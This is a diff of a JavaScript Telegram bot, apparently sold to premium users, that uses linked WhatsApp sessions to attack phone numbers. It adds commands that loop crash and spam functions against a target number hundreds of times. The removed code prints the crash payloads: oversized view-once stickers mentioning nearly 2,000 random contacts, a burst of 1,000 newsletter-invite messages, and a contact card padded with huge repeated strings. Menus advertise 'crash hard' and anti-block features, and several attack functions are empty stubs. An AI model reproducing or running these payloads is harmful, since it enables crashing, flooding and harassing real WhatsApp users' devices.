 
-// ================= FITUR ADD CELAH ================= //
 bot.onText(/\/addcelah/, async (msg) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
@@ -1378,7 +1595,6 @@ bot.onText(/\/addcelah/, async (msg) => {
     await safeEditMessageText(chatId, loadingMsg.message_id, `✅ *Berhasil menyimpan ${addedCount} celah baru ke database!*\n\n📊 Total celah tersimpan: ${celahDatabase.length}`, { parse_mode: "Markdown" });
 });
 
-// ================= FITUR LIST CELAH ================= //
 bot.onText(/\/listcelah/, async (msg) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
@@ -1405,7 +1621,6 @@ bot.onText(/\/listcelah/, async (msg) => {
     await safeSendMessage(chatId, response, { parse_mode: "HTML" });
 });
 
-// ================= FITUR DEL CELAH ================= //
 bot.onText(/\/delcelah (\w+)/, async (msg, match) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
@@ -1422,7 +1637,6 @@ bot.onText(/\/delcelah (\w+)/, async (msg, match) => {
     await safeSendMessage(chatId, `✅ *Berhasil menghapus celah!*\n\nType: ${removed.type}\nID: ${removed.id}`, { parse_mode: "Markdown" });
 });
 
-// ================= FITUR TESTFUNCTION ================= //
 bot.onText(/\/testfunction(?:\s+(\d+)\s+(\d+))?/, async (msg, match) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
@@ -1458,7 +1672,127 @@ bot.onText(/\/testfunction(?:\s+(\d+)\s+(\d+))?/, async (msg, match) => {
     }
 });
 
-// ================= FITUR PREMIUM & ADMIN ================= //
+// ================= BUG COMMANDS ================= //
+
+bot.onText(/\/XspamForce(?:\s+(\d+))?/, async (msg, match) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    const chatType = msg.chat.type;
+    const hasAccess = await checkUserAccess(userId, chatId, chatType, "xspamforce");
+    if (!hasAccess) return;
+    if (!match[1]) {
+        return safeSendMessage(chatId, "🪧 *Format:* /XspamForce 628xxx\n\n💡 *Fitur:* Spam Force Anti Kenok\n✅ Support Nokos Fresh\n✅ Anti Blokir\n✅ 2 Function Combo (CrashFrHome + StickerFC)\n✅ Bebas spam tanpa jeda", { parse_mode: "Markdown" });
+    }
+    const targetNumber = match[1].replace(/[^0-9]/g, "");
+    const target = `${targetNumber}@s.whatsapp.net`;
+    const date = getCurrentDate();
+    if (sessions.size === 0) return safeSendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
+    const sock = sessions.values().next().value;
+    await safeSendMessage(chatId, createBugSuccessMessage(targetNumber, "XspamForce (Anti Kenok)", date), { parse_mode: "HTML", reply_markup: createCheckButton(targetNumber) });
+    for (let i = 0; i < 500; i++) {
+        await CrashFrHome(sock, target);
+        await StickerFC(sock, target);
+        await sleep(100);
+    }
+});
+
+bot.onText(/\/Xploit(?:\s+(\d+))?/, async (msg, match) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    const chatType = msg.chat.type;
+    const hasAccess = await checkUserAccess(userId, chatId, chatType, "xploit");
+    if (!hasAccess) return;
+    if (!match[1]) return safeSendMessage(chatId, "🪧 Format: /xploit 628xxx");
+    const targetNumber = match[1].replace(/[^0-9]/g, "");
+    const target = `${targetNumber}@s.whatsapp.net`;
+    const date = getCurrentDate();
+    if (sessions.size === 0) return safeSendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
+    const sock = sessions.values().next().value;
+    await safeSendMessage(chatId, createBugSuccessMessage(targetNumber, "xploit", date), { parse_mode: "HTML", reply_markup: createCheckButton(targetNumber) });
+    for (let i = 0; i < 1; i++) { await FCinvis(sock, target); }
+});
+
+bot.onText(/\/Sanjiva(?:\s+(\d+))?/, async (msg, match) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    const chatType = msg.chat.type;
+    const hasAccess = await checkUserAccess(userId, chatId, chatType, "sanjiva");
+    if (!hasAccess) return;
+    if (!match[1]) return safeSendMessage(chatId, "🪧 Format: /Sanjiva 628xxx");
+    const targetNumber = match[1].replace(/[^0-9]/g, "");
+    const target = `${targetNumber}@s.whatsapp.net`;
+    const date = getCurrentDate();
+    if (sessions.size === 0) return safeSendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
+    const sock = sessions.values().next().value;
+    await safeSendMessage(chatId, createBugSuccessMessage(targetNumber, "Sanjiva", date), { parse_mode: "HTML", reply_markup: createCheckButton(targetNumber) });
+    for (let i = 0; i < 10; i++) { await xatanicaldelayv2(sock, target); await sleep(100); }
+});
+
+bot.onText(/\/Stova(?:\s+(\d+))?/, async (msg, match) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    const chatType = msg.chat.type;
+    const hasAccess = await checkUserAccess(userId, chatId, chatType, "stova");
+    if (!hasAccess) return;
+    if (!match[1]) return safeSendMessage(chatId, "🪧 Format: /Stova 628xxx");
+    const targetNumber = match[1].replace(/[^0-9]/g, "");
+    const target = `${targetNumber}@s.whatsapp.net`;
+    const date = getCurrentDate();
+    if (sessions.size === 0) return safeSendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
+    const sock = sessions.values().next().value;
+    await safeSendMessage(chatId, createBugSuccessMessage(targetNumber, "Stova", date), { parse_mode: "HTML", reply_markup: createCheckButton(targetNumber) });
+    for (let i = 0; i < 7; i++) { await brem(sock, target); await sleep(100); }
+});
+
+bot.onText(/\/Chatms(?:\s+(\d+))?/, async (msg, match) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    const chatType = msg.chat.type;
+    const hasAccess = await checkUserAccess(userId, chatId, chatType, "chatms");
+    if (!hasAccess) return;
+    if (!match[1]) return safeSendMessage(chatId, "🪧 Format: /Chatms 628xxx");
+    const targetNumber = match[1].replace(/[^0-9]/g, "");
+    const target = `${targetNumber}@s.whatsapp.net`;
+    const date = getCurrentDate();
+    if (sessions.size === 0) return safeSendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
+    const sock = sessions.values().next().value;
+    await safeSendMessage(chatId, createBugSuccessMessage(targetNumber, "Chatms", date), { parse_mode: "HTML", reply_markup: createCheckButton(targetNumber) });
+    for (let i = 0; i < 500; i++) { await FCinvisTes(sock, target); await sleep(3000); }
+});
+
+bot.onText(/\/Ganesha(?:\s+(\d+))?/, async (msg, match) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    const chatType = msg.chat.type;
+    const hasAccess = await checkUserAccess(userId, chatId, chatType, "ganesha");
+    if (!hasAccess) return;
+    if (!match[1]) return safeSendMessage(chatId, "🪧 Format: /Ganesha 628xxx");
+    const targetNumber = match[1].replace(/[^0-9]/g, "");
+    const target = `${targetNumber}@s.whatsapp.net`;
+    const date = getCurrentDate();
+    if (sessions.size === 0) return safeSendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
+    const sock = sessions.values().next().value;
+    await safeSendMessage(chatId, createBugSuccessMessage(targetNumber, "Ganesha", date), { parse_mode: "HTML", reply_markup: createCheckButton(targetNumber) });
+    for (let i = 0; i < 10; i++) { await bulldozerV2(sock, target); await sleep(100); }
+});
+
+bot.onText(/\/sendbug(?:\s+(\d+))?/, async (msg, match) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    const chatType = msg.chat.type;
+    const hasAccess = await checkUserAccess(userId, chatId, chatType, "sendbug");
+    if (!hasAccess) return;
+    if (!match[1]) return safeSendMessage(chatId, "🪧 Format: /sendbug 628xxx");
+    const targetNumber = match[1].replace(/[^0-9]/g, "");
+    const target = `${targetNumber}@s.whatsapp.net`;
+    const date = getCurrentDate();
+    if (sessions.size === 0) return safeSendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
+    const sock = sessions.values().next().value;
+    await safeSendMessage(chatId, createBugSuccessMessage(targetNumber, "sendbug", date), { parse_mode: "HTML", reply_markup: createCheckButton(targetNumber) });
+    for (let i = 0; i < 35; i++) { await VisiFriend(sock, target); await sleep(100); }
+});
+
+// ================= OWNER/ADMIN COMMANDS ================= //
 
 const pendingPremiumPoll = {};
 
@@ -1560,282 +1894,6 @@ bot.onText(/\/listadmin/, async (msg) => {
         message += `${index + 1}. ID: <code>${admin}</code>\n\n`;
     });
     safeSendMessage(chatId, message, { parse_mode: "HTML" });
-});
-
-bot.on("poll_answer", async (answer) => {
-    const pollData = pendingPremiumPoll[answer.poll_id];
-    if (!pollData) return;
-    if (answer.user.id !== pollData.adminId) return;
-    const choice = answer.option_ids[0];
-    let days;
-    if (choice === 0) days = 7;
-    if (choice === 1) days = 14;
-    if (choice === 2) days = 30;
-    if (choice === 3) days = "permanent";
-    let expiresAt;
-    if (days === "permanent") {
-        expiresAt = "permanent";
-    } else {
-        expiresAt = Date.now() + days * 86400000;
-    }
-    const existing = premiumUsers.find(u => u.id === pollData.userId);
-    if (!existing) {
-        premiumUsers.push({ id: pollData.userId, expiresAt });
-    } else {
-        existing.expiresAt = expiresAt;
-    }
-    savePremiumUsers();
-    safeSendMessage(pollData.chatId, `✅ Premium berhasil ditambahkan\n\n👤 User ID: ${pollData.userId}\n⏳ Durasi: ${days === "permanent" ? "Permanent" : days + " Hari"}`);
-    delete pendingPremiumPoll[answer.poll_id];
-});
-
-// ================= CALLBACK QUERY HANDLER ================= //
-bot.on("callback_query", async (query) => {
-    if (!query.message) return;
-    const chatId = query.message.chat.id;
-    const currentMessageId = query.message.message_id;
-    const data = query.data;
-    const userId = query.from.id;
-
-    if (data && data.startsWith("autofix_")) {
-        const originalMsgId = parseInt(data.replace("autofix_", ""));
-        const pendingData = global.pendingFix ? global.pendingFix[originalMsgId] : null;
-        if (!pendingData) {
-            await bot.answerCallbackQuery(query.id, { text: "❌ Data tidak ditemukan, coba ulangi /cekfunc" }).catch(() => {});
-            return;
-        }
-        await bot.answerCallbackQuery(query.id, { text: "🔧 Memperbaiki code 100% akurat..." }).catch(() => {});
-        const fixResult = autoFixJavaScript(pendingData.code, pendingData.error);
-        let resultText = `✅ *CODE DIPERBAIKI 100%!*\n\n`;
-        resultText += `📊 *${fixResult.fixes.length} perbaikan:*\n`;
-        fixResult.fixes.slice(0, 10).forEach(f => resultText += `• ${f}\n`);
-        resultText += `\n🟢 *HASIL AKHIR:*\n\`\`\`javascript\n${fixResult.fixed.substring(0, 2000)}\n\`\`\``;
-        if (fixResult.fixed.length > 2000) {
-            resultText += `\n\n📁 Code panjang, dikirim sebagai file...`;
-            await safeSendMessage(chatId, resultText, { parse_mode: "Markdown" });
-            const filePath = `fixed_${Date.now()}.js`;
-            fs.writeFileSync(filePath, fixResult.fixed);
-            await bot.sendDocument(chatId, filePath, { caption: `✅ Fixed code - ${fixResult.fixes.length} issues fixed` });
-            fs.unlinkSync(filePath);
-        } else {
-            await safeSendMessage(chatId, resultText, { parse_mode: "Markdown" });
-        }
-        delete global.pendingFix[originalMsgId];
-        await bot.answerCallbackQuery(query.id).catch(() => {});
-        return;
-    }
-
-    if (buttonIntervals.has(currentMessageId)) {
-        clearInterval(buttonIntervals.get(currentMessageId));
-        buttonIntervals.delete(currentMessageId);
-    }
-    if (globalIntervalId) {
-        clearInterval(globalIntervalId);
-        globalIntervalId = null;
-    }
-    discoActive = false;
-
-    let caption = "";
-    let replyMarkup = {};
-    let selectedImage = getRandomImage();
-
-    if (data === "trashmenu") {
-        caption = `<blockquote>─━━─━━⧼ BUG MENU ⧽─━━─━━</blockquote>
-<b>─━━─━━⧼ INFORMASI USER ⧽─━━─━━:</b>
-🎩 Pemilik : @ItsMeXanderRzMd 🌟    
-😄 Owner : @realmarz 🌟
-🍽 Version : ${CURRENT_VERSION}
-🗡 Platform : Telegram
-<b>─━━─━━⧼ FITUR BUG ⧽─━━─━━:</b>
-─▢ /sendbug +628
-─▢ /clear +628
-<b>╰➤ hapus bug</b>
-<b>─━━─━━⧼ BUG MENU ⧽─━━─━━:</b>
-# Primrose Linux Bot 𖣂
-─▢ /Xploit 
-<b>╰➤ blank hard</b>
-─▢ /Sanjiva
-<b>╰➤ delay hard murbug</b>
-─▢ /Stova 
-<b>╰➤ new delay brutality murbug</b>
-─▢ /Chatms +628
-<b>╰➤ crash hard</b>
-─▢ /Ganesha +628
-<b>╰➤ Buldo hard</b>
-─▢ /XspamForce +628
-<b>╰➤ spam force anti kenok (2 function combo)</b>
-<pre>──────────────────────────
-   MENU: Pilih Fitur Bug Menu di Atas 
-──────────────────────────</pre>`
-        replyMarkup = { inline_keyboard: [[{ text: "🔙 BACK", callback_data: "back_to_main" }]] }
-    } else if (data === "owner_menu") {
-        caption = `<blockquote><b>☠ PRIMROSE LINUX BOT ACCESS ☠</b></blockquote>
-🎩 Pemilik : @ItsMeXanderRzMd 🌟    
-😄 Owner : @realmarz 🌟
-🍽 Version : ${CURRENT_VERSION}
-🗡 Platform : Telegram     
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-┃      ▢ /addprem &lt;id&gt;
-┃      ╰➤ Menambahkan akses premium pada user
-┃      ▢ /delprem &lt;id&gt;
-┃      ╰➤ Menghapus akses premium pada user
-┃      ▢ /addadmin &lt;id&gt;
-┃      ╰➤ Menambahkan akses admin pada user
-┃      ▢ /deladmin &lt;id&gt;
-┃      ╰➤ Menghapus akses admin pada user
-┃      ▢ /listprem
-┃      ╰➤ Melihat list premium user yang ada
-┃      ▢ /listadmin
-┃      ╰➤ Melihat list admin
-┃      ▢ /reqpair ☇ Number
-┃      ╰➤ Menambah Sender WhatsApp
-┃      ▢ /update on/off
-┃      ╰➤ Mengaktifkan/menonaktifkan auto update
-┃      ▢ /autoupdate
-┃      ╰➤ Update manual dari GitHub
-┃      ▢ /checkupdate
-┃      ╰➤ Cek versi terbaru
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-<blockquote><b>NOTE:</b>
-Baca dengan teliti Jangan asal ngetik untuk mendapatkan akses</blockquote>`
-        replyMarkup = { inline_keyboard: [[{ text: "🔙 BACK", callback_data: "back_to_main" }]] }
-    } else if (data === "group_security_menu") {
-        caption = `<blockquote><b>🔒 XGROUPSECURITY MENU 🔒</b></blockquote>
-🎩 Pemilik : @ItsMeXanderRzMd 🌟
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-┃      ▢ /blokcmd &lt;command&gt;
-┃      ╰➤ Mem-block command bug
-┃      ▢ /bukacmd &lt;command&gt;
-┃      ╰➤ Membuka block command bug
-┃      ▢ /addpremgrup &lt;hari&gt;
-┃      ╰➤ Menambah grup ke premium (gunakan di grup)
-┃      ▢ /delpremgrup
-┃      ╰➤ Menghapus grup dari premium
-┃      ▢ /listpremgrub
-┃      ╰➤ Menampilkan member premium dalam grup
-┃      ▢ /add (ketik "add" di grup premium)
-┃      ╰➤ Menambah diri sebagai premium user
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-<blockquote><b>NOTE:</b>
-Command hanya bisa digunakan oleh admin grup</blockquote>`
-        replyMarkup = { inline_keyboard: [[{ text: "🔙 BACK", callback_data: "back_to_main" }]] }
-    } else if (data === "toolsbug_menu") {
-        caption = `<blockquote><b>🛠️ XTOOLSBUG MENU 🛠️</b></blockquote>
-🎩 Pemilik : @ItsMeXanderRzMd 🌟
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-┃      ▢ /testfunction &lt;number&gt; &lt;jumlah&gt;
-┃      ╰➤ Reply dengan function bug
-┃      ▢ /celahfunc &lt;reply func atau file&gt;
-┃      ╰➤ Extract celah dari function
-┃      ▢ /addcelah &lt;reply func atau file&gt;
-┃      ╰➤ Menyimpan celah ke database
-┃      ▢ /listcelah
-┃      ╰➤ Menampilkan semua celah tersimpan
-┃      ▢ /delcelah &lt;id&gt;
-┃      ╰➤ Menghapus celah dari database
-┃      ▢ /cekfunc &lt;reply func&gt;
-┃      ╰➤ Cek error function + auto fix 100%
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-<blockquote><b>NOTE:</b>
-Gunakan tools ini untuk testing dan debugging</blockquote>`
-        replyMarkup = { inline_keyboard: [[{ text: "🔙 BACK", callback_data: "back_to_main" }]] }
-    } else if (data === "change_color_menu") {
-        const options = ["🔴 XRED", "🔵 XBLUE", "🟢 XGREEN", "⚪ XWHITE", "🌈 XDISCO"]
-        const poll = await bot.sendPoll(chatId, "🎨 PILIH WARNA BUTTON", options, { is_anonymous: false, allows_multiple_answers: false })
-        pendingColorPoll[poll.poll.id] = { chatId: chatId, userId: userId, from: query.from, currentMessageId: currentMessageId }
-        return await bot.answerCallbackQuery(query.id).catch(() => {});
-    } else if (data === "back_to_main") {
-        const runtimeStatus = formatRuntime()
-        const memoryStatus = formatMemory()
-        const status = sessions.size > 0 ? "🟢 ACTIVE" : "🔴 OFFLINE"
-        const botNumber = sessions.size
-        const isWhite = (currentColor === "secondary")
-        const buttonStyle = isWhite ? undefined : (currentColor === "disco" ? buttonStyles[0] : currentColor)
-        let keyboard = [
-            [{ text: "XBUGS", callback_data: "trashmenu", style: buttonStyle }, { text: "XTOOLSBUG", callback_data: "toolsbug_menu", style: buttonStyle }],
-            [{ text: "XSETTINGS", callback_data: "owner_menu", style: buttonStyle }, { text: "XGROUPSECURITY", callback_data: "group_security_menu", style: buttonStyle }],
-            [{ text: "XCHANGECOLOR", callback_data: "change_color_menu", style: buttonStyle }, { text: "DEVELOPERS", url: "https://t.me/ItsMeXanderRzMd", style: buttonStyle }]
-        ]
-        if (isWhite) keyboard = JSON.parse(JSON.stringify(keyboard).replace(/"style":undefined/g, '"style":null').replace(/"style":null/g, ''))
-        const caption = `<blockquote><strong>☠ # Primrose Linux Bot 𖣂 ☠</strong></blockquote>
-🎩 Pemilik : @ItsMeXanderRzMd 🌟    
-😄 Owner : @realmarz 🌟
-🍽 Version : ${CURRENT_VERSION} 
-🗡 Platform : Telegram
-<blockquote><b>――⧼ STATUS BOT ⧽――</b></blockquote>
-⛧ Status : ${status}
-⛧ Number : ${botNumber}
-⛧ Runtime : ${runtimeStatus}
-⛧ Memory : ${memoryStatus}`
-        await safeEditMessageMedia(chatId, currentMessageId, { type: 'photo', media: getRandomImage(), caption: caption, parse_mode: "HTML" }, { reply_markup: { inline_keyboard: keyboard } })
-        if (currentColor === "disco") {
-            if (buttonIntervals.has(currentMessageId)) {
-                clearInterval(buttonIntervals.get(currentMessageId))
-                buttonIntervals.delete(currentMessageId)
-            }
-            if (globalIntervalId) clearInterval(globalIntervalId)
-            discoActive = true
-            let index = 0
-            globalIntervalId = setInterval(async () => {
-                if (!discoActive) return
-                index = (index + 1) % buttonStyles.length
-                const newStyle = buttonStyles[index]
-                let newKeyboard = [
-                    [{ text: "XBUGS", callback_data: "trashmenu", style: newStyle }, { text: "XTOOLSBUG", callback_data: "toolsbug_menu", style: newStyle }],
-                    [{ text: "XSETTINGS", callback_data: "owner_menu", style: newStyle }, { text: "XGROUPSECURITY", callback_data: "group_security_menu", style: newStyle }],
-                    [{ text: "XCHANGECOLOR", callback_data: "change_color_menu", style: newStyle }, { text: "DEVELOPERS", url: "https://t.me/ItsMeXanderRzMd", style: newStyle }]
-                ]
-                await safeEditMessageReplyMarkup(chatId, currentMessageId, { inline_keyboard: newKeyboard });
-            }, 1500)
-            buttonIntervals.set(currentMessageId, globalIntervalId)
-        }
-        return await bot.answerCallbackQuery(query.id).catch(() => {});
-    }
-
-    if (caption !== "") {
-        await safeEditMessageMedia(chatId, currentMessageId, { type: 'photo', media: selectedImage, caption: caption, parse_mode: "HTML" }, { reply_markup: replyMarkup });
-    }
-    await bot.answerCallbackQuery(query.id).catch(() => {});
-});
-
-// Poll color handler
-bot.on("poll_answer", async (answer) => {
-    const pollData = pendingColorPoll[answer.poll_id];
-    if (!pollData) return;
-    const selectedOption = answer.option_ids[0];
-    let selectedColor = "";
-    if (selectedOption === 0) selectedColor = "XRED";
-    else if (selectedOption === 1) selectedColor = "XBLUE";
-    else if (selectedOption === 2) selectedColor = "XGREEN";
-    else if (selectedOption === 3) selectedColor = "XWHITE";
-    else if (selectedOption === 4) selectedColor = "XDISCO";
-    const colorValue = getColorFromChoice(selectedColor);
-    saveColorSetting(colorValue);
-    currentColor = colorValue;
-    if (buttonIntervals.has(pollData.currentMessageId)) {
-        clearInterval(buttonIntervals.get(pollData.currentMessageId));
-        buttonIntervals.delete(pollData.currentMessageId);
-    }
-    if (globalIntervalId) {
-        clearInterval(globalIntervalId);
-        globalIntervalId = null;
-    }
-    discoActive = false;
-    await sendColoredMenu(pollData.chatId, pollData.from, colorValue, pollData.currentMessageId);
-    delete pendingColorPoll[answer.poll_id];
-});
-
-bot.onText(/\/start/, async (msg) => {
-    const chatId = msg.chat.id;
-    const from = msg.from;
-    const userId = from.id;
-    const chatType = msg.chat.type;
-    const isGroup = chatType === "group" || chatType === "supergroup";
-    const isOwnerUser = OWNER_ID.toString() === userId.toString();
-    if (!isGroup && !isPremium(userId) && !isOwnerUser) {
-        return safeSendMessage(chatId, "❌ Akses ditolak! Anda bukan user premium. Hubungi owner untuk membeli premium.");
-    }
-    await sendStartMenu(chatId, from);
 });
 
 bot.onText(/\/update (on|off)/, async (msg, match) => {
@@ -2012,296 +2070,326 @@ bot.onText(/^add$/i, async (msg) => {
     safeSendMessage(chatId, `✅ Selamat @${username || userId}! Anda telah mendapatkan akses premium selama ${remainingDays} hari. Silakan gunakan command bug yang tersedia.`, { parse_mode: "HTML" });
 });
 
-// ================= BUG FUNCTIONS ================= //
-
-async function CrashFrHome(sock, target) {
-    try {
-        const stickerMsg = {
-            viewOnceMessage: {
-                message: {
-                    stickerMessage: {
-                        url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
-                        fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
-                        fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
-                        mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
-                        mimetype: "image/webp",
-                        directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
-                        fileLength: { low: 1, high: 0, unsigned: true },
-                        mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
-                        isAnimated: true,
-                        contextInfo: {
-                            mentionedJid: [target, ...Array.from({ length: 1990 }, () => "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net")],
-                        },
-                    },
-                },
-            },
-        };
-        await sock.sendMessage(target, stickerMsg);
-        console.log("✅ CrashFrHome sticker sent to:", target);
-        for (let i = 0; i < 1000; i++) {
-            await sock.sendMessage(target, {
-                viewOnceMessage: {
-                    message: {
-                        eventMessage: {
-                            newsletterAdminInviteMessage: {
-                                newsletterJid: "33333333333333333@newsletter",
-                                newsletterName: "FrezeHomeAbouse",
-                            },
-                        },
-                    },
-                },
-            });
-            console.log(`📤 CrashFrHome sending to ${target} - iteration ${i + 1}`);
-            await sleep(50);
-        }
-    } catch (e) {
-        console.log("❌ Error in CrashFrHome:", e);
-    }
-}
-
-async function StickerFC(sock, target) {
-    try {
-        const message = {
-            "groupStatusMessageV2": {
-                "message": {
-                    "stickerMessage": {
-                        "url": "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
-                        "fileSha256": "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
-                        "fileEncSha256": "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
-                        "mediaKey": "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
-                        "mimetype": "image/webp",
-                        "directPath": "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
-                        "fileLength": "10610",
-                        "mediaKeyTimestamp": "1775044724",
-                        "stickerSentTs": "1775044724091"
-                    }
-                }
-            }
-        };
-        await sock.relayMessage(target, message, {});
-        console.log("✅ StickerFC sent to:", target);
-    } catch (err) {
-        console.error("❌ Error StickerFC:", err);
-    }
-}
-
-async function Zxxcontact(sock, target) {
-    try {
-        const contactMessage = {
-            viewOnceMessage: {
-                message: {
-                    contactMessage: {
-                        displayName: "카나이 하티".repeat(20000),
-                        vcard: "BEGIN:VCARD\nVERSION:3.0\nFN:" + "카나이 하티".repeat(10000) + "\nORG:" + "아르케인 엑소시스트".repeat(10000) + "\nADR;TYPE=WORK:;;" + "서울특별시 강남구 테헤란로 101".repeat(10000) + ";;;\nTEL;type=CELL;waid=821012345678:" + "+821012345678".repeat(10000) + "\nNOTE:" + "관리자 전용 계정입니다.".repeat(20000) + "\nEND:VCARD"
-                    }
-                }
-            }
-        };
-        await sock.relayMessage(target, contactMessage, { participant: { jid: target } });
-        console.log("✅ Zxxcontact sent to:", target);
-    } catch (err) {
-        console.error("❌ Error Zxxcontact:", err);
-    }
-}
-
-async function FCinvisTes(sock, target) {
-    const message = {
-        "groupStatusMessageV2": {
-            "message": {
-                "stickerMessage": {
-                    "url": "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
-                    "fileSha256": "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
-                    "fileEncSha256": "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
-                    "mediaKey": "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
-                    "mimetype": "image/webp",
-                    "directPath": "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
-                    "fileLength": "10610",
-                    "mediaKeyTimestamp": "1775044724",
-                    "stickerSentTs": "1775044724091"
-                }
-            }
-        }
-    };
-    return await sock.relayMessage(target, message, { participant: { jid: target } });
-}
-
-async function brem(sock, target) { }
-async function VisiFriend(sock, target) { }
-async function OfferXForclose(sock, target) { }
-async function bulldozerV2(sock, target) { }
-async function xatanicaldelayv2(sock, target) { }
-async function MbaPe(sock, target) { }
-
-function createBugSuccessMessage(targetNumber, bugType, date) {
-    return `
-<blockquote>⬡═―—⊱「 Primrose Linux Bot 」⊰―—═⬡</blockquote>
-
-◉ Target : ${targetNumber}
-◉ Type Bug : ${bugType}
-◉ Status : Successfully Send
-◉ Date Now : ${date}
-
-<blockquote>⸙ Spam Free at will</blockquote>`;
-}
-
-function createCheckButton(targetNumber) {
-    return { inline_keyboard: [[{ text: "📱 CEK TARGET", url: `https://wa.me/${targetNumber}` }]] };
-}
-
-function getCurrentDate() {
-    return new Date().toLocaleString('id-ID', { year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit' });
-}
-
-async function checkUserAccess(userId, chatId, chatType, commandName) {
-    const isOwnerUser = isOwner(userId);
-    const isPremiumUser = isPremium(userId);
-    if (isCommandBlocked(commandName)) return false;
-    if (isOwnerUser) return true;
-    if (chatType === "private" && !isPremiumUser) {
-        await safeSendMessage(chatId, "❌ Akses ditolak! Anda bukan user premium. Hubungi owner untuk membeli premium.");
-        return false;
-    }
-    return true;
-}
-
-// ================= COMMAND /XspamForce ================= //
-bot.onText(/\/XspamForce(?:\s+(\d+))?/, async (msg, match) => {
-    const chatId = msg.chat.id;
-    const userId = msg.from.id;
-    const chatType = msg.chat.type;
-    const hasAccess = await checkUserAccess(userId, chatId, chatType, "xspamforce");
-    if (!hasAccess) return;
-    if (!match[1]) {
-        return safeSendMessage(chatId, "🪧 *Format:* /XspamForce 628xxx\n\n💡 *Fitur:* Spam Force Anti Kenok\n✅ Support Nokos Fresh\n✅ Anti Blokir\n✅ 2 Function Combo (CrashFrHome + StickerFC)\n✅ Bebas spam tanpa jeda", { parse_mode: "Markdown" });
-    }
-    const targetNumber = match[1].replace(/[^0-9]/g, "");
-    const target = `${targetNumber}@s.whatsapp.net`;
-    const date = getCurrentDate();
-    if (sessions.size === 0) return safeSendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
-    const sock = sessions.values().next().value;
